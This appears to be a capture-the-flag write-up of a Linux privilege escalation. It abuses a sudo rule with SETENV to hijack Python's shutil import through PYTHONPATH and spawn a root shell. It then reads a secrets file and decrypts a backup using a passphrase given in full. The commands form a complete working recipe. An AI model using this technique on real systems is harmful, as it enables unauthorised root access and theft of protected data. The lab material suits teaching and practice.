## Operation Data Leak

### Enumeration & Reconnaissance
Upon connecting to the service, you are greeted by a standard shell as the user analyst. The first step in any Linux privilege escalation audit is checking what commands the current user can execute with sudo:

```Bash
sudo -l
Output:

Plaintext
Matching Defaults entries for analyst on host:
    env_reset, mail_badpass, secure_path=..., use_pty

User analyst may run the following commands on host:
    (root) NOPASSWD: SETENV: /usr/bin/python3 /opt/tech_diag.py
```

This reveals two crucial vectors:

* We can execute `/usr/bin/python3 /opt/tech_diag.py` as root without a password.

* The SETENV: directive is explicitly enabled, meaning we are allowed to pass custom environment variables (such as PYTHONPATH) through sudo.

### Vulnerability Analysis
Inspecting the target script /opt/tech_diag.py reveals the following structure:

```Python
#!/usr/bin/env python3
import os
import sys
import datetime

print("[*] Running Initech System Diagnostics...")
print(f"[*] System time checked: {datetime.datetime.now()}")

# Vulnerable import point
import shutil

print("[*] Diagnostics complete. No anomalies found.")
```

Because the script imports the standard library module shutil, Python searches for shutil.py across its import paths (sys.path). If we can prepend a custom directory to Python's search path using the PYTHONPATH environment variable, Python will load our malicious shutil.py instead of the system-wide one—running whatever code we place inside it with the privileges of the script runner (root).

### Exploitation Steps
1. Navigate to a writable directory:
Since analyst has write permissions in /tmp, move into that directory:
    `cd /tmp`

2. Create the malicious module (shutil.py):
    Write a fake shutil.py that spawns an interactive root shell using subprocess:
    ```Bash
    cat << 'EOF' > shutil.py
    import subprocess
    subprocess.call(['/bin/bash', '-p'])
    EOF
    ```
3. Execute the PrivEsc vector:
    Run the diagnostic script via sudo, injecting /tmp into the PYTHONPATH:
    ```Bash
    sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/tech_diag.py
    ```
       Result: The script triggers our custom shutil.py during execution, dropping us immediately into a root shell (whoami returns root).

4. Extract the Evidence:
Navigate to the protected evidence folder, decrypt the backup archive with the key in the secrets.conf, and read the flag:

```Bash
cd /root/evidence
cat secrets.conf
gpg --batch --passphrase "Initech_Secret_Backup_Key_2026!" -o project_alpha_bkp.tar -d project_alpha_bkp.tar.gpg
tar -xvf project_alpha_bkp.tar
cat /project_alpha/flag.txt
```